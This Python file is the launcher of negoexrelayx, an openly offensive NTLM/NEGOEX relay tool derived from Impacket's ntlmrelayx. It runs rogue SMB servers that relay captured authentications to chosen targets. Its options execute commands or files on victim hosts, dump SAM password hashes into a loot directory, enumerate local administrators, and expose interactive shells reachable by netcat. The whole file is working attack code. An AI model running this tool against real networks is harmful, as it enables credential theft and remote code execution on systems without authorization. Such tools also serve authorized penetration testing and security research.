#!/usr/bin/env python
####################
#
# Copyright (c) 2022 Mor Rubin (@rubin_mor)
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
####################
#
# This tool is based on ntlmrelayx, part of Impacket
# Copyright (c) 2013-2018 SecureAuth Corporation
#
# Impacket is provided under under a slightly modified version
# of the Apache Software License.
# See https://github.com/SecureAuthCorp/impacket/blob/master/LICENSE
# for more information.
#
#
# Ntlmrelayx authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema / Outsider Security (www.outsidersecurity.nl)
#

import argparse
import sys
import logging
import cmd
try:
    from urllib.request import ProxyHandler, build_opener, Request
except ImportError:
    from urllib2 import ProxyHandler, build_opener, Request

import json
from time import sleep
from threading import Thread

from impacket import version
from impacket.examples import logger
from servers import SMBRelayServer
from utils.config import NEGOEXRelayxConfig
from utils.targetsutils import TargetsProcessor, TargetsFileWatcher

RELAY_SERVERS = []

class MiniShell(cmd.Cmd):
    def __init__(self, relayConfig, threads):
        cmd.Cmd.__init__(self)

        self.prompt = 'negoexrelayx> '
        self.tid = None
        self.relayConfig = relayConfig
        self.intro = 'Type help for list of commands'
        self.relayThreads = threads
        self.serversRunning = True

    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))

        # And now the rows
        for row in items:
            print(outputFormat.format(*row))

    def emptyline(self):
        pass

    def do_targets(self, line):
        for url in self.relayConfig.target.originalTargets:
            print(url.geturl())
        return

    def do_finished_attacks(self, line):
        for url in self.relayConfig.target.finishedAttacks:
            print (url.geturl())
        return

    def do_startservers(self, line):
        if not self.serversRunning:
            start_servers(options, self.relayThreads)
            self.serversRunning = True
            logging.info('Relay servers started')
        else:
            logging.error('Relay servers are already running!')

    def do_stopservers(self, line):
        if self.serversRunning:
            stop_servers(self.relayThreads)
            self.serversRunning = False
            logging.info('Relay servers stopped')
        else:
            logging.error('Relay servers are already stopped!')

    def do_exit(self, line):
        print("Shutting down, please wait!")
        return True

    def do_EOF(self, line):
        return self.do_exit(line)

def start_servers(options, threads):
    for server in RELAY_SERVERS:
        #Set up config
        c = NEGOEXRelayxConfig()
        c.setProtocolClients(PROTOCOL_CLIENTS)
        c.setTargets(targetSystem)
        c.setExeFile(options.e)
        c.setCommand(options.c)
        c.setEnumLocalAdmins(options.enum_local_admins)
        c.setDisableMulti(options.no_multirelay)
        c.setEncoding(codec)
        c.setMode(mode)
        c.setAttacks(PROTOCOL_ATTACKS)
        c.setLootdir(options.lootdir)
        c.setOutputFile(options.output_file)
        c.setInteractive(options.interactive)
        c.setIPv6(options.ipv6)
        c.setSMB2Support(options.smb2support)
        c.setInterfaceIp(options.interface_ip)
        c.setListeningPort(options.smb_port)
        c.setNewClientName(options.clientname)

        s = server(c)
        s.start()
        threads.add(s)
    return c

def stop_servers(threads):
    todelete = []
    for thread in threads:
        if isinstance(thread, tuple(RELAY_SERVERS)):
            thread.server.shutdown()
            todelete.append(thread)
    # Now remove threads from the set
    for thread in todelete:
        threads.remove(thread)
        del thread

# Process command-line arguments.
if __name__ == '__main__':

    print(version.BANNER)
    #Parse arguments
    parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will "
                                    "try to relay that connection to specified target(s) system or the original client")
    parser._optionals.title = "Main options"

    #Main arguments
    parser.add_argument("-h","--help", action="help", help='show this help message and exit')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-t',"--target", action='store', metavar = 'TARGET', help="Target to relay the credentials to, "
                                  "can be an IP, hostname or URL like domain\\username@host:port (domain\\username and port "
                                  "are optional, and don't forget to escape the '\\'). If unspecified, it will relay back "
                                  "to the client')")
    parser.add_argument('-tf', action='store', metavar = 'TARGETSFILE', help='File that contains targets by hostname or '
                                                                             'full URL, one per line')
    parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list '
                                                        'automatically (only valid with -tf)')
    parser.add_argument('-i','--interactive', action='store_true',help='Launch an smbclient or LDAP console instead'
                        'of executing a command after a successful relay. This console will listen locally on a '
                        ' tcp port and can be reached with for example netcat.')

    # Interface address specification
    parser.add_argument('-ip','--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to '
                  'bind SMB and HTTP servers',default='')

    parser.add_argument('--smb-port', type=int, help='Port to listen on smb server', default=445)

    parser.add_argument('--no-multirelay', action="store_true", required=False, help='If set, disable multi-host relay (SMB and HTTP servers)')
    parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection')
    parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
    parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR',default='.', help='Loot '
                    'directory in which gathered loot such as SAM dumps will be stored (default: current directory).')
    parser.add_argument('-of','--output-file', action='store',help='base output filename for encrypted hashes. Suffixes '
                                                                   'will be added for ntlm and ntlmv2')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute ntlmrelayx.py '
                                                       'again with -codec and the corresponding codec ' % sys.getdefaultencoding())
    parser.add_argument('-smb2support', action="store_true", default=False, help='SMB2 Support')
    parser.add_argument('-6','--ipv6', action='store_true',help='Listen on both IPv6 and IPv4')
    parser.add_argument('--serve-image', action='store',help='local path of the image that will we returned to clients')
    parser.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on '
                        'target system (for SMB and RPC). If not specified for SMB, hashes will be dumped (secretsdump.py must be'
                        ' in the same directory). For RPC no output will be provided.')
    parser.add_argument('-clientname', action='store', type=str, required=False, help='A new name for the client name ')

    #SMB arguments
    smboptions = parser.add_argument_group("SMB client options")

    smboptions.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. '
                                     'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
    smboptions.add_argument('--enum-local-admins', action='store_true', required=False, help='If relayed user is not admin, attempt SAMR lookup to see who is (only works pre Win 10 Anniversary)')

    try:
       options = parser.parse_args()
    except Exception as e:
       logging.error(str(e))
       sys.exit(1)

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)

    # Let's register the protocol clients we have
    # ToDo: Do this better somehow
    from clients import PROTOCOL_CLIENTS
    from attacks import PROTOCOL_ATTACKS

    if options.clientname is not None:
        if (len(options.clientname) > 16):
            raise Exception("Client name cannot be larger than 16 chars")

    if options.codec is not None:
        codec = options.codec
    else:
        codec = sys.getdefaultencoding()

    if options.target is not None:
        logging.info("Running in relay mode to single host")
        mode = 'RELAY'
        targetSystem = TargetsProcessor(singleTarget=options.target, protocolClients=PROTOCOL_CLIENTS, randomize=options.random)
        # Disabling multirelay feature (Single host + general candidate)
        if targetSystem.generalCandidates:
            options.no_multirelay = True
    else:
        if options.tf is not None:
            #Targetfile specified
            logging.info("Running in relay mode to hosts in targetfile")
            targetSystem = TargetsProcessor(targetListFile=options.tf, protocolClients=PROTOCOL_CLIENTS, randomize=options.random)
            mode = 'RELAY'
        else:
            logging.info("Running in reflection mode")
            targetSystem = None
            mode = 'REFLECTION'

    RELAY_SERVERS.append(SMBRelayServer)

    if targetSystem is not None and options.w:
        watchthread = TargetsFileWatcher(targetSystem)
        watchthread.start()

    threads = set()
    socksServer = None

    c = start_servers(options, threads)

    print("")
    logging.info("Servers started, waiting for connections")
    try:
        sys.stdin.read()
    except KeyboardInterrupt:
        pass
    else:
        pass

    for s in threads:
        del s

    sys.exit(0)
